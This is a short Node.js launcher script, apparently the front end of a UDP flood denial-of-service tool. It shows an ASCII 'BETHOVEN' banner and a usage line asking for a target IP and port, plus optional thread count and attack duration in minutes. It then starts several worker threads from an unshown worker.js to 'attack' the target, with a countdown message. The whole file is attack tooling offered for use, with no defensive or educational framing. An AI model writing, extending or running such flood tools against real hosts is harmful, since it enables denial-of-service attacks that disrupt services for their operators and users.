const { Worker } = require('worker_threads');

console.log('\x1b[38;5;134m', `

____  _____ _____ _   _  ___   _____     _______ _   _
| __ )| ____|_   _| | | |/ _ \ / _ \ \   / / ____| \ | |
|  _ \|  _|   | | | |_| | | | | | | \ \ / /|  _| |  \| |
| |_) | |___  | | |  _  | |_| | |_| |\ V / | |___| |\  |
|____/|_____| |_| |_| |_|\___/ \___/  \_/  |_____|_| \_|

            
                  [Edit by GuilianaDDT]
     
     

`);
const [node, dir, address, port, threads = 4, time = 5] = process.argv;

if (!address || !port) {
  return console.log('\x1b[38;5;134m', ' Use: \'node . <ip> <port> [<Packets> (default 5)] [<tiempo> (minutos)]\'')
}

for (let i = 0; i < threads; i++) {
  console.log('\x1b[38;5;134m', `[UDPDDt] cargando en la linea de attacks #${i}...`)

  const worker = new Worker('./worker.js');
  worker.postMessage({
    address,
    port,
    time,
    thread: i
  });
}

console.log('\x1b[38;5;134m', "[UDPDDt]comienza en 3...")